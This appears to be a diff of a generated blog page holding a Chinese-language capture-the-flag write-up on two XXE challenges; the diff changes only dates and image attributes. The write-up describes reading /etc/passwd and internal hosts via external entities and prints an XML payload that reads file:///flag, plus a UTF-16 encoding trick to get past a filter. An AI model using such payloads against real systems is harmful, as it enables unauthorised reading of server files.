@@ -36,7 +36,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/4.png">
 <meta property="og:image" content="http://yoursite.com/2020/06/02/xxeChallenge/5.png">
 <meta property="article:published_time" content="2020-06-02T14:59:41.000Z">
-<meta property="article:modified_time" content="2020-07-08T02:06:04.807Z">
+<meta property="article:modified_time" content="2020-07-14T05:12:13.841Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="buu">
 <meta name="twitter:card" content="summary">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-08 10:06:04" itemprop="dateModified" datetime="2020-07-08T10:06:04+08:00">2020-07-08</time>
+                <time title="Modified: 2020-07-14 13:12:13" itemprop="dateModified" datetime="2020-07-14T13:12:13+08:00">2020-07-14</time>
               </span>
 
           
@@ -242,17 +242,17 @@
         <p>前述：xxe国内题目较少，总结在一起，方便回顾<a id="more"></a></p>
 <h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>开题是个登录框，题目说了是xml的题，直接想到xxe，不用尝试sql注入了</p>
 <p>用burp抓包登录，可以看到抓到的数据就是xxe的格式，尝试外部实体注入读取/etc/passwd，成功,没啥东西，来看看/etc/hosts,发现存活主机</p>
-<img src="/2020/06/02/xxeChallenge/1.png" class="" title="examplename">
+<img src="/2020/06/02/xxeChallenge/1.png" class="">
 
 <p>那就直接http访问主机，结果如下</p>
-<img src="/2020/06/02/xxeChallenge/2.png" class="" title="examplename">
+<img src="/2020/06/02/xxeChallenge/2.png" class="">
 
 <p>报错了，那就是没有这台主机，其他师傅说这是要打内网的主机，需要跑脚本，但是这题好像后一个地址就是了，那就试试</p>
-<img src="/2020/06/02/xxeChallenge/3.png" class="" title="examplename">
+<img src="/2020/06/02/xxeChallenge/3.png" class="">
 
 <p>可以看到读到了flag，这里内网主机可以用burp爆破，脚本暂时没找到</p>
 <h3 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h3><p>文件上传，在about处得知flag在根目录下，在upload处有个提示，是xml的格式</p>
-<img src="/2020/06/02/xxeChallenge/4.png" class="" title="examplename">
+<img src="/2020/06/02/xxeChallenge/4.png" class="">
 
 <p>看到这个，应该就是上传一个xml 的文件来打了</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span>  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -267,7 +267,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8 -t utf-16 file1&gt;file2</span><br></pre></td></tr></table></figure>
 
 <p>将转换完的文件上传</p>
-<img src="/2020/06/02/xxeChallenge/5.png" class="" title="examplename">
+<img src="/2020/06/02/xxeChallenge/5.png" class="">
     </div>
 
     
